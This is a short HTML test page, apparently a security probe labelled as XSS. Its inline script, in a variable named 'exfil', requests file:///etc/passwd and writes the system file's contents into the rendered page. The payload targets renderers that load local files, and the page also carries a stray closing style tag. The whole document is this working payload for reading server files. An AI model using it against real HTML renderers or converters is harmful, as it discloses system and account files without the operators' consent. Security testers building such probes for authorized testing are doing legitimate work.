<!DOCTYPE html>
<html>
<head>
  <meta charset=UTF-8>
  <title>Security Test - XSS</title>
  </style>
</head>
<body>
  <script>
    exfil = new XMLHttpRequest();
    exfil.open("GET","file:///etc/passwd");
    exfil.send();
    exfil.onload = function(){document.write(this.responseText);}
    exfil.onerror = function(){document.write('failed!')}
</script>
   
  <h1>Test success</h1>
  
    
</body>
</html>
